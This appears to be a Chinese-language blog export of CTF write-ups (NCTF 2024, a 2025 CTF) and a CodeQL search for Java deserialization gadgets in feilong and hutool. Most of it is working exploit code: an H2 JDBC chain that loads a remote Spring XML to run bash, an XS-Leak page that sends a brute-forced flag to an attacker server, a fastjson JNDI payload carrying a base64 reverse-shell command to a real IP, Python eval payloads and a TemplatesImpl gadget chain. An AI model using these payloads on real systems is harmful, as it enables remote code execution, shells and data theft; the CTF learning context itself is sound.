getter链子。堆栈如下：\nchallenge.MyDataSource#getConnection\rjdk.internal.reflect.GeneratedMethodAccessor12#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rorg.springframework.aop.support.AopUtils#invokeJoinpointUsingReflection\rorg.springframework.aop.framework.JdkDynamicAopProxy#invoke\rjdk.proxy2.$Proxy61#getConnection\rjdk.internal.reflect.GeneratedMethodAccessor11#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField\rcom.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields\rcom.fasterxml.jackson.databind.ser.BeanSerializer#serialize\rcom.fasterxml.jackson.databind.SerializerProvider#defaultSerializeValue\rcom.fasterxml.jackson.databind.node.POJONode#serialize\rcom.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#_serializeNonRecursive\rcom.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#serialize\rcom.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize\rcom.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize\rcom.fasterxml.jackson.databind.ser.DefaultSerializerProvider#_serialize\rcom.fasterxml.jackson.databind.ser.DefaultSerializerProvider#serializeValue\rcom.fasterxml.jackson.databind.ObjectWriter$Prefetch#serialize\rcom.fasterxml.jackson.databind.ObjectWriter#_writeValueAndClose\rcom.fasterxml.jackson.databind.ObjectWriter#writeValueAsString\rcom.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString\rcom.fasterxml.jackson.databind.node.BaseJsonNode#toString\rcom.sun.org.apache.xpath.internal.objects.XString#equals\rorg.springframework.aop.target.HotSwappableTargetSource#equals\rjava.util.HashMap#putVal\rjava.util.HashMap#readObject\rjdk.internal.reflect.GeneratedMethodAccessor6#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rjava.io.ObjectStreamClass#invokeReadObject\rjava.io.ObjectInputStream#readSerialData\rjava.io.ObjectInputStream#readOrdinaryObject\rjava.io.ObjectInputStream#readObject0\rjava.io.ObjectInputStream#readObject\rjava.io.ObjectInputStream#readObject\rchallenge.IndexController#deserialize 有h2 driver。但环境为eclipse-temurin:17-jre镜像，JAVA_HOME下没有javac，所以无法编译自定义方法。可能是因为jdk版本高，TRIGGER获取js引擎是获取不到。同时有没有Grooxy依赖，所以传统利用方法都失效了。\n查看文档发现可以调用任意public static方法。\nhttps://www.h2database.com/html/features.html 由于jdk moduel限制，Hessian反序列化打的那些gadget不能用。\n找到org.h2.util.Utils#newInstance方法可以触发构造方法：\npublic static Object newInstance(String var0, Object... var1) throws Exception { Constructor var2 = null; int var3 = 0; Constructor[] var4 = Class.forName(var0).getConstructors(); int var5 = var4.length; for(int var6 = 0; var6 \u0026lt; var5; ++var6) { Constructor var7 = var4[var6]; int var8 = match(var7.getParameterTypes(), var1); if (var8 \u0026gt; var3) { var3 = var8; var2 = var7; } } if (var2 == null) { throw new NoSuchMethodException(var0); } else { return var2.newInstance(var1); } } org.springframework.context.support.ClassPathXmlApplicationContext类的构造方法可以RCE，参数为java.lang.String\nPOC：\npublic class Exp { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod writeReplace = ctClass0.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); String url = \u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS expNewInstance FOR \u0026#39;org.h2.util.Utils.newInstance\u0026#39;\\\\;CALL expNewInstance(\u0026#39;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#39;,\u0026#39;http://ip:port/exp.xml\u0026#39;)\\\\;\u0026#34;; MyDataSource myDataSource = new MyDataSource(url, \u0026#34;username\u0026#34;,\u0026#34;password\u0026#34;); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(myDataSource); // exp类 Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler); POJONode poJoNode = new POJONode(proxy); XString x = new XString(\u0026#34;123\u0026#34;); HashMap map = makeMap(x, poJoNode); ser(map); } public static HashMap\u0026lt;Object, Object\u0026gt; makeMap (Object obj1, Object obj2) throws Exception { HotSwappableTargetSource v1 = new HotSwappableTargetSource(obj2); HotSwappableTargetSource v2 = new HotSwappableTargetSource(obj1); HashMap\u0026lt;Object, Object\u0026gt; s = new HashMap\u0026lt;\u0026gt;(); setFieldValue(s, \u0026#34;size\u0026#34;, 2); Class\u0026lt;?\u0026gt; nodeC; try { nodeC = Class.forName(\u0026#34;java.util.HashMap$Node\u0026#34;); } catch (ClassNotFoundException e) { nodeC = Class.forName(\u0026#34;java.util.HashMap$Entry\u0026#34;); } Constructor\u0026lt;?\u0026gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null)); setFieldValue(s, \u0026#34;table\u0026#34;, tbl); return s; } } 但执行会报错：\norg.h2.jdbc.JdbcSQLDataException: Data conversion error converting \u0026#34;CHARACTER VARYING to JAVA_OBJECT\u0026#34;; SQL statement: newInstance方法签名中的参数为String var0, Object... var1，h2数据库无法直接将字符串http://ip:port/exp.xml转换成Object。\n然后又找到一个反序列化接口，可以先将字符串http://ip:port/exp.xml序列化，然后在h2 sql中执行反序列化并保存为变量，然后传参给newInstance即可。\norg.h2.util.JdbcUtils#deserialize方法可以触发原生反序列化，返回值为Object。\npublic static Object deserialize(byte[] var0, JavaObjectSerializer var1) { try { if (var1 != null) { return var1.deserialize(var0); } else if (serializer != null) { return serializer.deserialize(var0); } else { ByteArrayInputStream var2 = new ByteArrayInputStream(var0); ObjectInputStream var3; if (SysProperties.USE_THREAD_CONTEXT_CLASS_LOADER) { final ClassLoader var4 = Thread.currentThread().getContextClassLoader(); var3 = new ObjectInputStream(var2) { protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass var1) throws IOException, ClassNotFoundException { try { return Class.forName(var1.getName(), true, var4); } catch (ClassNotFoundException var3) { return super.resolveClass(var1); } } }; } else { var3 = new ObjectInputStream(var2); } return var3.readObject(); } } catch (Throwable var5) { throw DbException.get(90027, var5, new String[]{var5.toString()}); } } var1为NULL即可，var0需要为字节数组，h2 sql字节数组的表示方法：\nhttps://www.h2database.com/html/grammar.html#bytes POC:\n// String path = \u0026#34;http://ip:port/exp.xml\u0026#34;; // ser(path); String path = \u0026#34;aced....\u0026#34;; // path 序列化数据的hex String url = \u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS deserialize FOR \u0026#39;org.h2.util.JdbcUtils.deserialize\u0026#39;\\\\;CREATE ALIAS expNewInstance FOR \u0026#39;org.h2.util.Utils.newInstance\u0026#39;\\\\;SET @path = (SELECT deserialize(X\u0026#39;\u0026#34; + path + \u0026#34;\u0026#39;,NULL))\\\\;CALL expNewInstance(\u0026#39;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#39;,@path)\\\\;\u0026#34;; 部署exp.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg \u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;bash\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;whoami\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; internal_api xs-leak，无cookie限制，无csrf_token限制，单纯的网路限制，直接script加载通过onload和onerror判断。\nPOC:\n\u0026lt;script src=http://192.168.72.132:8000/search?s=a onerror=top.sign=false onload=top.sign=true\u0026gt;\u0026lt;/script\u0026gt; 当搜索结果为空时报500错误，触发onerror，有数据时状态码为200，触发onload。\nscript标签只会在html docuemnt加载时执行，如果之后通过js写入新的script不会被执行。通过iframe嵌入子页面，在子页面里重新加载DOM树可以再次执行script标签。将script写入iframe srcdoc属性里即可：\nvpsip换成自己的服务器。部署以下html文件，让bot访问即可。\nPOC：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; let sign = undefined; const host = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34;; const CHA = \u0026#34;0123456789abcdef-}\u0026#34;; const sleep = (ms) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); const sendback = async (data) =\u0026gt; { var xhr = await new XMLHttpRequest(); await xhr.open(\u0026#39;GET\u0026#39;, \u0026#39;http://\u0026lt;vpsip\u0026gt;:port/?flag=\u0026#39; + encodeURI(data), true); await xhr.send(); } const send = async (payload) =\u0026gt; { top.sign = undefined; top.document.getElementById(\u0026#39;workspace\u0026#39;).innerHTML = \u0026#39;\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39; + host + encodeURI(payload) + atob(\u0026#39;IG9uZXJyb3I9dG9wLnNpZ249ZmFsc2Ugb25sb2FkPXRvcC5zaWduPXRydWU+PC9zY3JpcHQ+Ij48L2lmcmFtZT4=\u0026#39;); while (top.sign === undefined){ await sleep(50); } return top.sign; } const main = async () =\u0026gt; { await sleep(500); var flag = \u0026#34;nctf{\u0026#34;; while (!flag.endsWith(\u0026#34;}\u0026#34;)){ for(var i = 0;i \u0026lt; CHA.length;i++){ var payload = flag + CHA.charAt(i); const s = await send(payload); if (s) { flag = await flag + CHA.charAt(i); await sendback(flag); } } } } main(); \u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;workspace\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 红明谷CTF 2025 日记本 扫目录得到/actuator/swagger-ui.html和/actuator/heapdump。\n注册接口已弃用，将v1改为v2即可，注意v2参数需要用get传输： /api/auth/update可以修改为admin权限，key可以从/actuator/heapdump读取。修改之后需要重新登录才能获得admin权限。\n/api/admin/hint可以下载源码。\n存在fastjson反序列化，有CC3.2.1依赖，但jdk版本为8u342，无法直接jndi加载恶意类，尝试LDAP反序列化绕过打CC链。\n触发jndi，用JNDIMap打CC1反序列化，反弹shell即可：\n{ \u0026#34;a\u0026#34;:{ \u0026#34;@type\u0026#34; : \u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\u0026#34;, \u0026#34;dataSourceName\u0026#34; : \u0026#34;ldap://119.45.252.144:1389/Deserialize/CommonsCollectionsK1/Command/YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TVRrdU5EVXVNalV5TGpFME5DODRNREF4SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==\u0026#34;, \u0026#34;autoCommit\u0026#34; : true }, \u0026#34;b\u0026#34;:{ \u0026#34;username\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;java.net.InetAddress\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;pppppasdasd.c37af96d-ec4e-43e4-8bd3-3c347d9eb7b8.dnshook.site\u0026#34; }, \u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34; } } java -jar JNDIMap-0.0.1.jar -i 119.45.252.144 根据admin控制器里的提示，flag在/app/F1A9.txt中。\n","permalink":"https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/","summary":"NCTF 2024 WEB AK ez_dash 过滤不全，可以通过\u0026lt;%%\u0026gt;执行python代码，但没有回显，用继承链获取bottle报错回显。\nhttps://www.osgeo.cn/bottle/stpl.html#embedded-python-code 使用getattr绕过.，bottle.abort(401, \u0026quot;message\u0026quot;)函数可以直接报错返回内容。\n\u0026lt;%eval(getattr(getattr(__import__(\u0026#39;base64\u0026#39;), \u0026#39;b64decode\u0026#39;)(\u0026#39;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp\u0026#39;), \u0026#39;decode\u0026#39;)())%\u0026gt; sqlmap-master 参数注入，sqlmap -hh查看详细信息：\n--eval=EVALCODE Evaluate provided Python code before the request (e.g.\r\u0026#34;import hashlib;id2=hashlib.md5(id).hexdigest()\u0026#34;) sqlmap的eval可以执行python代码：\nsqlmap -u http://localhost --eval=\u0026#34;print(1)\u0026#34; 通过__import__报错回显，注意payload不能包含空格，不然会被分割。\npoc:\nhttp://localhost --eval=__import__(__import__(\u0026#39;os\u0026#39;).popen(__import__(\u0026#39;base64\u0026#39;).b64decode(\u0026#39;ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==\u0026#39;).decode()).read()) ez_dash_revenge 远程环境pydash版本比较高，不允许覆盖__globals__和__builtin__，\n黑名单检测代码pydash/helpers.py： RESTRICTED_KEYS内容为：\nRESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 覆盖黑名单POC：\n/setValue?name=pydash\r{\u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\u0026#34;value\u0026#34;:[]} 然后再通过__globals__覆盖题目自定义的黑名单,POC:\n/setValue?name=setval\r{\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_name__\u0026#34;,\u0026#34;value\u0026#34;:[]}\r{\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_path__\u0026#34;,\u0026#34;value\u0026#34;:[]} bottle模板引擎使用正则匹配模板字符串，set_syntax代码如下：\ndef set_syntax(self, syntax): self._syntax = syntax self._tokens = syntax.split() if syntax not in self._re_cache: names = \u0026#39;block_start block_close line_start inline_start inline_end\u0026#39; etokens = map(re.","title":"CTF记录-NCTF_2024, 红明谷CTF_2025"},{"content":"数据库构建 feilong\nreadme中关于安装的命令：\ngit clone https://github.com/ifeilong/feilong.git --depth 1 mvn install 根据这个写出数据库构建语句，并加上一些跳过选项：\ncodeql database create feilong-database --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn clean -DskipTests -Drat.skip=true package\u0026#34; hutool\nhutool安装要通过install.sh链接，内容如下：\n#!/bin/bash exec mvn -T 1C clean source:jar javadoc:javadoc install -Dmaven.test.skip=false -Dmaven.javadoc.skip=false 根据这个脚本内容写，把里面的Test和Doc都改成True，跳过Test和文档生成，节省时间。\ncodeql database create hutool-database --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn -T 1C clean source:jar javadoc:javadoc package -DskipTests -Drat.skip=true -Dmaven.javadoc.skip\u0026#34; feilong数据库大概5分钟就建好了，hutool可能需要十几分钟。\ncodeql不同版本可能有细微差异，要参照文档写：https://codeql.github.com/codeql-standard-libraries/java/\nGetter java.beans包下有一些操作bean的类，其中java.beans.PropertyDescriptor#getReadMethod和java.beans.PropertyDescriptor#getWriteMethod用于获取相应Getter/Setter的Method对象。根据这个写出Sink点，查找能够调用Getter的gadget：\npredicate callGetterSinks(Method method) {\rexists(MethodAccess call |\r(\rcall.getCallee().getQualifiedName().matches(\u0026#34;%getReadMethod%\u0026#34;)\r) and call.getCaller() = method\r)\r} 对于反序列化来说还需要限制方法所在类实现了序列化接口或者是静态方法：\nimport java\rpredicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\u0026#34;java.io.Serializable\u0026#34;) and rt.extendsOrImplements(ref) )\r}\rpredicate callGetterSinks(Method method) {\rexists(MethodAccess call |\r(\rcall.getCallee().hasQualifiedName(\u0026#34;java.beans\u0026#34;, \u0026#34;PropertyDescriptor\u0026#34;, \u0026#34;getReadMethod\u0026#34;)\r) and call.getCaller() = method and (\rmethod.isStatic() or isSerializable(method.getDeclaringType())\r)\r)\r}\rfrom Method method\rwhere callGetterSinks(method)\rselect method.getQualifiedName() feilong中的结果：\ncom.feilong.core.bean.PropertyValueObtainer.getValue com.feilong.json.builder.SensitiveWordsPropertyNameAndJsonValueProcessorMapBuilder.getPropertyNamesWithAnnotation com.feilong.lib.beanutils.PropertyUtilsBean.getReadMethod com.feilong.lib.beanutils.DefaultBeanIntrospector.handleIndexedPropertyDescriptors com.feilong.lib.json.util.IsIgnoreUtil.isIgnore com.feilong.lib.ognl.OgnlRuntime.getPropertyDescriptors PropertyComparator#compare方法会调用PropertyUtilsBean#getReadMethod方法，堆栈如下：\njava.beans.PropertyDescriptor#getReadMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getReadMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare 获得getter Method后会直接invoke：PropertyUtilsBean#getSimpleProperty\nprivate static Object getSimpleProperty(Object bean, String name, PropertyDescriptor descriptor) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException { Method readMethod = getReadMethod(bean.getClass(), descriptor); if (readMethod == null) { throw new NoSuchMethodException(\u0026#34;Property \u0026#39;\u0026#34; + name + \u0026#34;\u0026#39; has no getter method in class \u0026#39;\u0026#34; + bean.getClass() + \u0026#34;\u0026#39;\u0026#34;); } else { return invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY); } } fury反序列化设置了黑名单，过滤了TemplatesImpl类。\ndeserialize 想找一个二次反序列化的入口，一般名字都类似于deserialize等，直接文本搜索就可以了。\ncn.hutool.core.convert.impl.BeanConverter类的convertInternal方法可以反序列化，代码如下：\nprotected T convertInternal(Object value) { ................ if (!(value instanceof Map) \u0026amp;\u0026amp; !(value instanceof ValueProvider) \u0026amp;\u0026amp; !BeanUtil.isBean(value.getClass())) { if (value instanceof byte[]) { return ObjectUtil.deserialize((byte[])((byte[])value), new Class[0]); ............... } cn.hutool.core.convert.AbstractConverter.convert会调用convertInternal.\n目前链子状态：\nreadObject -\u0026gt;\rgetter -\u0026gt; \u0026lt;空缺\u0026gt; -\u0026gt;\rAbstractConverter#convert -\u0026gt;\rObjectUtil.deserialize sink好写，直接规定能够调用AbstractConverter#convert即可：\nclass Sink extends Method{\rSink(){\rexists(MethodAccess ac| ac.getCallee().getQualifiedName().matches(\u0026#34;%cn.hutool.core.convert.AbstractConverter.convert%\u0026#34;) and this = ac.getCaller()\r)\r}\r} source设为invokeMethod能够调用到的方法，除了以get开头的getter，还可以加上动态代理的invoke方法：\nclass Source extends Method{\rSource(){\rnot this.isStatic() and this.isPublic() and (\r( // getter\rthis.getQualifiedName().matches(\u0026#34;%.get%\u0026#34;) and this.hasNoParameters()\r) or ( // invoke\rthis.getQualifiedName().matches(\u0026#34;%.invoke\u0026#34;)\r)\r)\r}\r} source和sink直接的连接条件设为如下：\npredicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\u0026#34;java.io.Serializable\u0026#34;) and rt.extendsOrImplements(ref) )\r}\rquery predicate edges(Method a, Method b) { a.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())\r} edges条件为：a调用b，且a和b为静态方法或者在实现了Serializable接口的类内。\n串联起来即可：\nimport java\rimport semmle.code.java.dataflow.FlowSources\rclass Source extends Method{\rSource(){\rnot this.isStatic() and this.isPublic() and (\r( // getter\rthis.getQualifiedName().matches(\u0026#34;%.get%\u0026#34;) and this.hasNoParameters()\r) or ( // invoke\rthis.getQualifiedName().matches(\u0026#34;%.invoke\u0026#34;)\r)\r)\r}\r} class Sink extends Method{\rSink(){\rexists(MethodAccess ac| ac.getCallee().getQualifiedName().matches(\u0026#34;%cn.hutool.core.convert.AbstractConverter.convert%\u0026#34;) and this = ac.getCaller()\r)\r}\r} predicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\u0026#34;java.io.Serializable\u0026#34;) and rt.extendsOrImplements(ref) )\r}\rquery predicate edges(Method a, Method b) { // a调用b，且a和b为静态方法或者在实现了Serializable接口的类内\ra.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())\r}\rfrom Source source, Sink sink\rwhere edges+(source, sink)\rselect source, source, sink, \u0026#34;$@ $@ to $@ $@\u0026#34; ,\rsource.getDeclaringType(),source.getDeclaringType().getName(),\rsource,source.getName(),\rsink.getDeclaringType(),sink.getDeclaringType().getName(),\rsink,sink.getName() 在hutool数据库内的查询结果如下： 底下三个JavaRuntimeInfo数据不可控，DynaBean中的invoke为静态方法，所以只有MapProxy可以用。\nMapProxy ConverterRegistry#convert能调用BeanConverter#convert，不过限制条件很多。\npublic \u0026lt;T\u0026gt; T convert(Type type, Object value, T defaultValue, boolean isCustomFirst) throws ConvertException { if (TypeUtil.isUnknown((Type)type) \u0026amp;\u0026amp; null == defaultValue) { return value; } else if (ObjectUtil.isNull(value)) { return defaultValue; } else { if (TypeUtil.isUnknown((Type)type)) { type = defaultValue.getClass(); } if (value instanceof Opt) { value = ((Opt)value).get(); if (ObjUtil.isNull(value)) { return defaultValue; } } if (value instanceof Optional) { value = ((Optional)value).orElse((Object)null); if (ObjUtil.isNull(value)) { return defaultValue; } } if (type instanceof TypeReference) { type = ((TypeReference)type).getType(); } if (value instanceof TypeConverter) { return ObjUtil.defaultIfNull(((TypeConverter)value).convert((Type)type, value), defaultValue); } else { Converter\u0026lt;T\u0026gt; converter = this.getConverter((Type)type, isCustomFirst); if (null != converter) { return converter.convert(value, defaultValue); } else { Class\u0026lt;T\u0026gt; rowType = TypeUtil.getClass((Type)type); if (null == rowType) { if (null == defaultValue) { return value; } rowType = defaultValue.getClass(); } T result = this.convertSpecial((Type)type, rowType, value, defaultValue); if (null != result) { return result; } else if (BeanUtil.isBean(rowType)) { return (new BeanConverter((Type)type)).convert(value, defaultValue); } else { throw new ConvertException(\u0026#34;Can not Converter from [{}] to [{}]\u0026#34;, new Object[]{value.getClass().getName(), ((Type)type).getTypeName()}); } } } } } 总结以下条件：\n被代理的接口需要定义getter 被代理的接口为public getter方法的返回值需要为Normal类（不是抽象类或接口） getter方法的返回值类型需要有setter方法。 综上写出搜索合适的Bean的脚本：\nimport java\rpredicate isSerializable(RefType rt) { // 实现Serializable接口\rexists(RefType ref | ref.getQualifiedName().matches(\u0026#34;java.io.Serializable\u0026#34;) and rt.extendsOrImplements(ref) )\r}\rpredicate hasSetter(RefType rt) { // 具有setter方法\rexists(Method m | rt.hasMethod(m, rt) and m.getQualifiedName().regexpMatch(\u0026#34;.*\\\\.set[^\\\\.]+\u0026#34;) and m.isPublic() and m.getReturnType().getName() = \u0026#34;void\u0026#34; and not m.isStatic()\r)\r}\rpredicate main(RefType rt1, RefType rt2) { // rt2为rt1 getter的返回值类型\rexists( Method m | rt1.hasMethod(m, rt1) and\rm.isPublic() and m.getQualifiedName().regexpMatch(\u0026#34;.*\\\\.get[^\\\\.]+\u0026#34;) and m.getReturnType() = rt2 and m.hasNoParameters()\r)\r}\rfrom Interface sc, Class sc2 // sc为被代理接口，sc2为sc的getter的返回值类型\rwhere sc.isPublic() and main(sc, sc2) and hasSetter(sc2) and not sc2.isAbstract()\rselect sc.getQualifiedName(), sc2.getQualifiedName() 结果如下： 有84组结果，第二组就可以用。代理java.awt.Shape接口，其getter方法getBounds的返回值类型java.awt.Rectangle有setter方法。\n反序列化的字节数组是从MapProxy中获取的，具体逻辑在MapProxy#invoke中。\nPOC如下：\nTemplates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); PriorityQueue\u0026lt;Object\u0026gt; tmpqueue = new PriorityQueue\u0026lt;\u0026gt;(2); tmpqueue.add(1); tmpqueue.add(1); Object[] tmpobjects = (Object[]) getFieldValue(tmpqueue, \u0026#34;queue\u0026#34;); tmpobjects[0] = templates; // 指定getter 为getOutputProperties Comparator\u0026lt;?\u0026gt; tmpcomparator = (Comparator\u0026lt;?\u0026gt;) new PropertyComparator(\u0026#34;outputProperties\u0026#34;); setFieldValue(tmpqueue, \u0026#34;comparator\u0026#34;, tmpcomparator); HashMap map = new HashMap(); map.put(\u0026#34;bounds\u0026#34;, ser(tmpqueue)); // 写入序列化数据 MapProxy mapProxy = new MapProxy(map); Shape b = (Shape) Proxy.newProxyInstance( // 代理Shape ClassLoader.getSystemClassLoader(), new Class[]{Shape.class}, mapProxy); b.getBounds(); 调用Shape#getBounds即可触发反序列化加载字节码。\n拼接起来 public class Exp { public static void main(String[] args) throws Exception{ Templates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); PriorityQueue\u0026lt;Object\u0026gt; tmpqueue = new PriorityQueue\u0026lt;\u0026gt;(2); tmpqueue.add(1); tmpqueue.add(1); Object[] tmpobjects = (Object[]) getFieldValue(tmpqueue, \u0026#34;queue\u0026#34;); tmpobjects[0] = templates; Comparator\u0026lt;?\u0026gt; tmpcomparator = (Comparator\u0026lt;?\u0026gt;) new PropertyComparator(\u0026#34;outputProperties\u0026#34;); setFieldValue(tmpqueue, \u0026#34;comparator\u0026#34;, tmpcomparator); HashMap map = new HashMap(); map.put(\u0026#34;bounds\u0026#34;, ser(tmpqueue)); MapProxy mapProxy = new MapProxy(map); Shape b = (Shape) Proxy.newProxyInstance( ClassLoader.getSystemClassLoader(), new Class[]{Shape.class}, mapProxy); PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(1); queue.add(1); Object[] objects = (Object[]) getFieldValue(queue, \u0026#34;queue\u0026#34;); objects[1] = b; // 这里顺序和上面template处不同，都是要保证可以类先被调用getter。 // 指定getter 为 getBounds Comparator\u0026lt;?\u0026gt; comparator = (Comparator\u0026lt;?\u0026gt;) new PropertyComparator(\u0026#34;bounds\u0026#34;); setFieldValue(queue, \u0026#34;comparator\u0026#34;, comparator); Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build(); byte[] data = fury.serialize(queue); System.out.println(Base64.getEncoder().encodeToString(data)); } } 堆栈：\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare\rjava.util.PriorityQueue#siftDownUsingComparator\rjava.util.PriorityQueue#siftDown\rjava.util.PriorityQueue#heapify\rjava.util.PriorityQueue#readObject\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rjava.io.ObjectStreamClass#invokeReadObject\rjava.io.ObjectInputStream#readSerialData\rjava.io.ObjectInputStream#readOrdinaryObject\rjava.io.ObjectInputStream#readObject0\rjava.io.ObjectInputStream#readObject\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.util.SerializeUtil#deserialize\rcn.hutool.core.util.ObjectUtil#deserialize\rcn.hutool.core.convert.impl.BeanConverter#convertI